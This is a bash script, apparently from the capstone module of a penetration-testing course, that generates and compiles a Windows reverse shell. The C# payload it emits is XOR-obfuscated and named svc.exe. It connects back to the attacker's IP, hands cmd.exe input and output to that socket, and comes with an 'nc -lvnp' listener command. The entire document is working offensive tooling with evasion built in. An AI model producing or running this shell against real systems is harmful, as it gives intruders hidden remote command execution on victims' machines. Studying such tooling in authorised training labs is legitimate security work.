#!/bin/bash
"""
Script: gen_cs_shell.sh
Module: 11 — Assembling The Pieces (Capstone)
Purpose: Generate an XOR-obfuscated C# reverse shell and compile to Windows EXE
Usage: ./gen_cs_shell.sh [interface] [port] [output_dir]
Target: Windows hosts with .NET / run via Mono-compiled mcs on attacker
"""

IFACE="${1:-tun0}"
LPORT="${2:-5986}"
OUTDIR="${3:-.}"

# Resolve attacker IP from interface
LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
if [[ -z "$LHOST" ]]; then
    echo "[-] Could not get IP from interface $IFACE"
    exit 1
fi

# Random XOR key 50–249
KEY=$(( RANDOM % 200 + 50 ))

echo "[*] LHOST: $LHOST  LPORT: $LPORT  XOR key: $KEY"

# XOR-encode a string and output as C# byte array literal
xor_string() {
    local s="$1"
    local out=""
    local i=0
    while [ $i -lt ${#s} ]; do
        local c=$(printf '%d' "'${s:$i:1}")
        out+="$(( c ^ KEY )),"
        (( i++ ))
    done
    echo "${out%,}"
}

HOST_ENC=$(xor_string "$LHOST")
PORT_ENC=$(xor_string "$LPORT")
CMD_ENC=$(xor_string "cmd.exe")

cat > "$OUTDIR/shell.cs" << CSEOF
using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;

class Shell {
    static string Dec(byte[] b, int k) {
        var sb = new StringBuilder();
        foreach (var c in b) sb.Append((char)(c ^ k));
        return sb.ToString();
    }
    static void Main() {
        int key = $KEY;
        string host = Dec(new byte[]{$HOST_ENC}, key);
        string port = Dec(new byte[]{$PORT_ENC}, key);
        string cmd  = Dec(new byte[]{$CMD_ENC},  key);

        var client = new TcpClient(host, int.Parse(port));
        var stream = client.GetStream();
        var proc   = new Process();
        proc.StartInfo.FileName               = cmd;
        proc.StartInfo.UseShellExecute        = false;
        proc.StartInfo.RedirectStandardInput  = true;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError  = true;
        proc.StartInfo.CreateNoWindow         = true;
        proc.Start();

        // stdout/stderr → socket
        proc.OutputDataReceived += (s, e) => {
            if (e.Data == null) return;
            var b = Encoding.ASCII.GetBytes(e.Data + "\n");
            stream.Write(b, 0, b.Length);
        };
        proc.ErrorDataReceived += (s, e) => {
            if (e.Data == null) return;
            var b = Encoding.ASCII.GetBytes(e.Data + "\n");
            stream.Write(b, 0, b.Length);
        };
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();

        // socket → stdin
        var sr = new StreamReader(stream);
        var sw = proc.StandardInput;
        string line;
        while ((line = sr.ReadLine()) != null) sw.WriteLine(line);
        proc.WaitForExit();
        client.Close();
    }
}
CSEOF

echo "[*] Compiling shell.cs → $OUTDIR/svc.exe"
mcs -out:"$OUTDIR/svc.exe" "$OUTDIR/shell.cs" 2>&1
if [ $? -eq 0 ]; then
    echo "[+] Compiled: $OUTDIR/svc.exe"
    echo "[+] Listener: rlwrap nc -lvnp $LPORT"
else
    echo "[-] Compilation failed — is mono-mcs installed? (apt install mono-mcs)"
fi
